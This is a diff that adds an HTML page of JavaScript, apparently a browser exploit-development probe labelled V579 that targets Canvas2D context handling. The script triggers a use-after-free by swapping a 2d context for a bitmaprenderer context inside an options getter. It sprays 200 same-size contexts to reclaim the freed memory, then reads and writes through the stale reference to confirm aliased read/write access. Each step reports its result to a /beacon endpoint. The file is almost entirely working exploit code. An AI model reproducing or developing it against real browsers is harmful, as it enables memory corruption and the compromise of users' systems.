@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V579</title></head>
+<body><pre id="out">V579 — same-type reclaim + inline stateStack (no external buffer)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V579-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},500);
+}
+var f64=new Float64Array(1);
+var u32=new Uint32Array(f64.buffer);
+function dblHex(d){f64[0]=d;return'0x'+('00000000'+u32[1].toString(16)).slice(-8)+('00000000'+u32[0].toString(16)).slice(-8);}
+
+bk('BOOT','v579-reclaim-diag');
+say('V579: same-type reclaim diagnostic');
+say('Goal: confirm inline stateStack + same-type reclaim avoids munmap crash');
+
+/* ===== Phase 1: UAF with INLINE stateStack (0 realized saves) =====
+   KEY INSIGHT: 32 saves WITHOUT a subsequent state mutation keeps
+   m_unrealizedSaveCount=32 but stateStack stays at size=1 (inline).
+   No external buffer is allocated, so no munmapped pages to crash into.
+
+   But realizeSaves() is called by EVERY state setter and by save() itself
+   if m_unrealizedSaveCount > 0... actually NO:
+     save() just increments m_unrealizedSaveCount
+     state setters call realizeSaves()
+
+   So: set lineWidth BEFORE saves. saves just bump counter. No realize.
+   After bitmaprenderer replaces context, destructor runs.
+   stateStack has size=1 (inline), ~400B inline buffer within the 768B context.
+   NO external buffer freed. The 768B context itself is freed.
+*/
+
+var innerCtx = null;
+var outerCanvas = null;
+
+function triggerUAF() {
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+  var d = {};
+  Object.defineProperty(d, 'alpha', {get: function() {
+    var ctx = c.getContext('2d');
+    innerCtx = ctx;
+    ctx.lineWidth = 1337.1337;
+    /* DO NOT save() or set lineWidth again — keep stateStack inline */
+    return true;
+  }});
+  c.getContext('bitmaprenderer', d);
+  outerCanvas = c;
+  return c;
+}
+
+bk('PRE-UAF','inline-trigger');
+triggerUAF();
+bk('POST-UAF','ctx='+(innerCtx?'ok':'null'));
+say('UAF triggered, innerCtx='+(innerCtx?'ok':'null'));
+
+/* ===== Phase 2: Same-type reclaim =====
+   Create many Canvas2D contexts (~768B each in FastMalloc).
+   One should reclaim the freed 768B slot.
+   The new context's stateStack is VALID (freshly initialized, inline).
+   m_buffer points to its own inline buffer. */
+
+var reclaimCanvases = [];
+var NRECLAIM = 200;
+for (var i = 0; i < NRECLAIM; i++) {
+  var rc = document.createElement('canvas');
+  rc.width = 1; rc.height = 1;
+  var rctx = rc.getContext('2d');
+  if (rctx) {
+    rctx.lineWidth = 42.42 + i * 0.001;
+    reclaimCanvases.push({c: rc, ctx: rctx});
+  }
+}
+bk('RECLAIM','n='+reclaimCanvases.length);
+say('Created '+reclaimCanvases.length+' reclaim contexts');
+
+/* ===== Phase 3: Read through stale reference =====
+   If same-type reclaim worked, lineWidth should be one of our 42.42+i values.
+   If no reclaim, lineWidth might be 1337.1337 (old data) or 1.0 (default) or 0 (zeroed). */
+
+var results = {};
+var props = ['lineWidth','miterLimit','globalAlpha','shadowBlur','lineDashOffset',
+             'textAlign','textBaseline','direction','font','lineCap','lineJoin',
+             'shadowColor','fillStyle','strokeStyle','filter'];
+for (var pi = 0; pi < props.length; pi++) {
+  try {
+    results[props[pi]] = innerCtx[props[pi]];
+  } catch(e) {
+    results[props[pi]] = 'ERR:'+e.name+':'+e.message.slice(0,60);
+  }
+}
+
+/* getTransform returns a DOMMatrix — 6 double fields */
+var xf = null;
+try { xf = innerCtx.getTransform(); } catch(e) { xf = 'ERR:'+e.name; }
+
+/* getContextAttributes — reads inline m_settings, no stateStack deref */
+var attrs = null;
+try { attrs = innerCtx.getContextAttributes(); } catch(e) { attrs = 'ERR:'+e.name; }
+
+bk('READ','done');
+say('\n=== Property reads ===');
+
+/* Decode lineWidth */
+var lw = results.lineWidth;
+if (typeof lw === 'string') {
+  bk('LW-ERR',lw);
+  say('lineWidth: '+lw);
+} else {
+  bk('LW','val='+lw+',hex='+dblHex(lw));
+  say('lineWidth = '+lw+' (hex: '+dblHex(lw)+')');
+
+  if (Math.abs(lw - 1337.1337) < 0.01) {
+    bk('STALE','original-value');
+    say('  >>> STALE: original value survived (no reclaim)');
+  } else if (lw >= 42.42 && lw < 42.42 + NRECLAIM * 0.001 + 0.001) {
+    var idx = Math.round((lw - 42.42) / 0.001);
+    bk('RECLAIM-HIT','idx='+idx+',val='+lw);
+    say('  >>> RECLAIM HIT: context['+idx+'] reclaimed the slot!');
+    say('  >>> Same-type reclaim CONFIRMED');
+  } else if (lw === 1.0) {
+    bk('DEFAULT','fresh-context');
+    say('  >>> DEFAULT: a fresh context (lineWidth=1.0) reclaimed the slot');
+    say('  >>> Same-type reclaim with default state');
+  } else if (lw === 0) {
+    bk('ZERO','zeroed');
+    say('  >>> ZERO: slot zeroed (calloc or decommit)');
+  } else {
+    bk('UNK','val='+lw+',hex='+dblHex(lw));
+    say('  >>> UNEXPECTED: possible heap data');
+  }
+}
+
+/* Report other double properties */
+var dblProps = ['miterLimit','globalAlpha','shadowBlur','lineDashOffset'];
+for (var pi = 0; pi < dblProps.length; pi++) {
+  var p = dblProps[pi];
+  var v = results[p];
+  if (typeof v === 'string') {
+    bk(p.slice(0,3).toUpperCase()+'-X',v);
+    say(p+': '+v);
+  } else {
+    bk(p.slice(0,3).toUpperCase(),'val='+v+',hex='+dblHex(v));
+    say(p+'='+v+' (hex:'+dblHex(v)+')');
+  }
+}
+
+/* String properties — these read CanvasStyle/String fields in State */
+var strProps = ['textAlign','textBaseline','direction','font','lineCap','lineJoin',
+                'shadowColor','fillStyle','strokeStyle','filter'];
+for (var pi = 0; pi < strProps.length; pi++) {
+  var p = strProps[pi];
+  var v = results[p];
+  if (typeof v === 'string' && v.indexOf('ERR:') === 0) {
+    bk(p.slice(0,4).toUpperCase()+'-X',v.slice(0,80));
+    say(p+': '+v);
+  } else {
+    bk(p.slice(0,4).toUpperCase(),'val='+String(v).slice(0,60));
+    say(p+'='+String(v));
+  }
+}
+
+/* Transform */
+if (xf && typeof xf !== 'string') {
+  bk('XF','a='+xf.a+',b='+xf.b+',c='+xf.c+',d='+xf.d+',e='+xf.e+',f='+xf.f);
+  say('transform: a='+xf.a+' b='+xf.b+' c='+xf.c+' d='+xf.d+' e='+xf.e+' f='+xf.f);
+} else {
+  bk('XF-X',String(xf));
+  say('transform: '+xf);
+}
+
+/* Context attributes */
+if (attrs && typeof attrs !== 'string') {
+  var aStr = JSON.stringify(attrs);
+  bk('ATTR',aStr.slice(0,200));
+  say('attributes: '+aStr);
+} else {
+  bk('ATTR-X',String(attrs));
+  say('attributes: '+attrs);
+}
+
+/* ===== Phase 4: Write test — can we modify through stale ref? ===== */
+var writeOK = false;
+try {
+  innerCtx.lineWidth = 9999.9999;
+  var readback = innerCtx.lineWidth;
+  writeOK = (Math.abs(readback - 9999.9999) < 0.01);
+  bk('WRITE','set=9999.9999,readback='+readback+',ok='+writeOK);
+  say('\nWrite test: set 9999.9999, readback='+readback+' ok='+writeOK);
+} catch(e) {
+  bk('WRITE-X',e.name);
+  say('\nWrite test FAILED: '+e.name);
+}
+
+/* If reclaim hit, check which reclaim context sees our write */
+if (writeOK) {
+  for (var i = 0; i < reclaimCanvases.length; i++) {
+    try {
+      var rlw = reclaimCanvases[i].ctx.lineWidth;
+      if (Math.abs(rlw - 9999.9999) < 0.01) {
+        bk('ALIAS','idx='+i+',lw='+rlw);
+        say('  >>> ALIAS FOUND: reclaimCanvases['+i+'] sees our write!');
+        say('  >>> Bidirectional R/W confirmed');
+        break;
+      }
+    } catch(e) {}
+  }
+}
+
+/* ===== Phase 5: Test save/restore through stale ref =====
+   This is the dangerous path — save() bumps m_unrealizedSaveCount,
+   then a state setter triggers realizeSaves() which grows the stateStack.
+   If this works, we can force external buffer allocation through the alias. */
+var saveOK = false;
+try {
+  innerCtx.save();
+  innerCtx.lineWidth = 7777.7777;
+  var afterSave = innerCtx.lineWidth;
+  innerCtx.restore();
+  var afterRestore = innerCtx.lineWidth;
+  saveOK = true;
+  bk('SAVE','afterSave='+afterSave+',afterRestore='+afterRestore);
+  say('\nSave/restore test:');
+  say('  after save+write: '+afterSave);
+  say('  after restore: '+afterRestore);
+} catch(e) {
+  bk('SAVE-X',e.name+':'+e.message.slice(0,60));
+  say('\nSave/restore FAILED: '+e.name);
+}
+
+bk('DONE','v579');
+say('\nV579 complete.');
+</script>
+</body></html>
